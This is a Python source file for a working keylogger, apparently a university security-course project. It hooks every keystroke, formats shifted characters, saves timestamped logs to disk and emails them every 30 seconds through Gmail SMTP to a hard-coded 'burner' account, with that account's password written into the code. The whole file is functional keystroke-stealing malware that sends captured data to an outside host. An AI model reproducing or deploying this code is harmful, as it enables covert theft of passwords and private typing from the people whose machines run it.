import keyboard
import smtplib

from threading import Timer
from datetime import datetime

REPORT_INTERVAL = 30
EMAILA = "cmsc414BH@gmail.com"  # address of burner account to receive reports
EMAILP = "P@$$word"             # password for burner account


class Keylogger:

    # **************************
    # Initialize keylogger object
    # **************************
    def __init__(self):
        self.filename = None                # inits filename
        self.interval = REPORT_INTERVAL     # how long in sec between txt file creation
        self.log = ""                       # creates an empty log to hold keystrokes
        self.startDate = datetime.now()     # inits start and end dates to be used in filename
        self.endDate = datetime.now()

    # **************************
    # begins cycle of keystroke logging for each key pressed
    # **************************
    def start(self):
        self.startDate = datetime.now()             # initializes start date for file name
        keyboard.on_release(callback=self.keyLog)   # runs logger for each keystroke pressed
        self.report()                               # report logs
        keyboard.wait()

    # **************************
    # Writes keystrokes to log
    # **************************
    def report(self):
        """Called every interval"""
        if self.log:                        # Report any amount of data in the log
            self.endDate = datetime.now()   # add finished timestamp for appending to filename
            self.updateFilename()           # final update to filename before saving/sending
            self.writeFile()                # write current log contents to file
            self.report_mail(EMAILA, EMAILP, self.log)  # send current log contents as email
            print(f"[{self.filename}] - {self.log}")    # output filename of processed report
            self.startDate = datetime.now()             # reset start time for next filename
        self.log = ""                       # clear log for next interval
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    # **************************
    # Control how keystrokes are recorded
    # **************************
    def keyLog(self, event):
        key = event.name
        if len(key) > 1:
            if keyboard.is_pressed("shift"):  # correctly display special characters
                if key == '1':
                    key = "!"
                elif key == '2':
                    key = '@'
                elif key == '3':
                    key = '#'
                elif key == '4':
                    key = '$'
                elif key == '5':
                    key = '%'
                elif key == '6':
                    key = '^'
                elif key == '7':
                    key = '&'
                elif key == '8':
                    key = '*'
                elif key == '9':
                    key = '('
                elif key == '0':
                    key = ')'
                else:
                    key = ""
            if key == "space":      # alternative to report printing "space"
                key = " "
            elif key == "enter":    # adds new line to report when [ENTER] is pressed
                key = "[ENTER]\n"
            elif key == "decimal":  # alternative to printing "[DECIMAL]"
                key = "."
            else:
                key = key.replace(" ", "_")  # replace spaces with underscores
                key = f"[{key.upper()}]"
        self.log += key

    # **************************
    # Format filename based on dates, times
    # **************************
    def updateFilename(self):
        startDateString = str(self.startDate)[:-7].replace(" ", "-").replace(":", "")
        endDateString = str(self.endDate)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog--{startDateString}_to_{endDateString}"

    # **************************
    # Write current logged data to txt file
    # **************************
    def writeFile(self):
        with open(f"G:\\My Drive\\CMSC 414\\Project\\keylogger reports\\{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(
            f"[+] Saved G:\\My Drive\\CMSC 414\\Project\\keylogger reports\\{self.filename}.txt")  # confirm file-write

    # **************************
    # sends report as email
    # **************************
    def report_mail(self, email, pw, msg):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)  # connect to email SMTP server
        server.starttls()                                       # starts TLS mode
        server.login(email, pw)                                 # logs in to burner email account
        server.sendmail(email, email, msg)                      # sends mail to itself
        server.quit()                                           # disconnects from SMTP server


# **************************
# Creates instance of keylogger class
# **************************
if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
